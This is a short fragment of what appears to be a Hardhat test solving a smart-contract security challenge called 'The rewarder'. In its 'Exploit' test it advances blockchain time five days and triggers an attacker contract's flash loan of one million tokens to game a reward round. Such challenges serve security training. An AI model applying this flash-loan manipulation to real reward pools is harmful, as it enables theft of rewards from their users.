...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        // Next Reward Round!
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        console.log(await this.accountingToken.totalSupply());  // 400
        console.log(await this.rewardToken.totalSupply());  // 100
        await this.attackerContract.execFlashLoans(ethers.utils.parseEther('1000000'));
        //await this.attackerContract.execFlashLoans(ethers.utils.parseEther('400'));
